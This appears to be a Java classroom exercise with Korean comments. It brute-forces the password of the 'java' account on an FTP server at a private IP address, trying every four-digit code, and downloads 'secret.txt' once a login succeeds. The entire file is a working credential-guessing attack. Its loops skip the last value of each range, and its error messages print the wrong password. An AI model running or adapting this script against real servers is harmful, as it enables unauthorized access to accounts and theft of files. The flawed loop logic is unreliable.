
import java.io.File;

import it.sauronsoftware.ftp4j.FTPClient;

public class Main {
	

	public static void main(String[] args) throws Exception {

		FTPClient client = new FTPClient(); // 컨트롤 쉬프트 o => import 단축키 / 내장 라이브러리 내에만 검색 / 
		client.connect("192.168.150.11", 21); // client 라는 인스턴스에 .connect 메소드를 적어서 서버 아이피 주소를 적는다.

		int i;
		int n = 0;

		for(i = 0;i < 9;i++) { // 000n 
			try {
				String password = ("000" + n++);
				client.login("java", password);
				client.download("secret.txt", new File("C:/Users/hezuc/Downloads/다운로드폴더/다운로드진짜성공1.txt"));
				System.exit(0);
			} catch (Exception e) {
				System.out.println("패스워드 오류 : " + "000" + n);
			}
		}

		n = 10;
		for(i = 10;i < 99;i++) { // 00nn 
			try {
				String password = ("00" + n++);
				client.login("java", password);
				client.download("secret.txt", new File("C:/Users/hezuc/Downloads/다운로드폴더/다운로드진짜성공2.txt"));
				System.exit(0);
			} catch (Exception e) {
				System.out.println("패스워드 오류 : " + "00" + n);
			}
		}

		n = 100;
		for(i = 100;i < 999;i++) { // 0nnn 
			try {
				String password = ("0" + n++);
				client.login("java", password);
				client.download("secret.txt", new File("C:/Users/hezuc/Downloads/다운로드폴더/다운로드진짜성공3.txt"));
				System.exit(0);
			} catch (Exception e) {
				System.out.println("패스워드 오류 : " + "0" + n);
			}
		}

		n = 1000;
		for(i = 1000;i < 9999;i++) { // nnnn
			try {
				String password = ("" + n++);
				client.login("java", password);
				client.download("secret.txt", new File("C:/Users/hezuc/Downloads/다운로드폴더/다운로드진짜성공4.txt"));
				System.exit(0);
			} catch (Exception e) {
				System.out.println("패스워드 오류 : " + n);
			}
		}
		

		// File file = new File("C:/Users/hezuc/Downloads/다운로드폴더/다운로드진짜성공.txt");

		// client.disconnect(true);

	}
}
